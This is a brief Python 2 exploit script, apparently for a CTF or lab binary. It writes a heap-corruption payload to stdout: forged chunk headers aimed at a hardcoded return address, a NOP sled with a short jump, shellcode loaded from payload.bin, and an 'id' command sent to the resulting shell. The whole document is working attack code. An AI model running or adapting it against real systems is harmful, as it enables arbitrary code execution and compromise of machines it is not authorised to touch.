#! /usr/bin/python2

import sys, struct

addr_ret_addr = 0x7fffffffe518
ret_addr = 0x60b040
payload = open('payload.bin').read()
chk_w = struct.pack('<qqqq', 1, 65, addr_ret_addr - 24, ret_addr) + ('A' * 32)
chk_z = struct.pack( '<qqqq', 1, 65, 0, 0) + ('B' * 32)
buf = struct.pack('<HH', 256, 256) + ('\x90' * 48) + '\xeb\x1e' + ('\x90' * (206 - len(payload))) + payload + chk_w + chk_z + '\nid\n'
sys.stdout.write(buf)
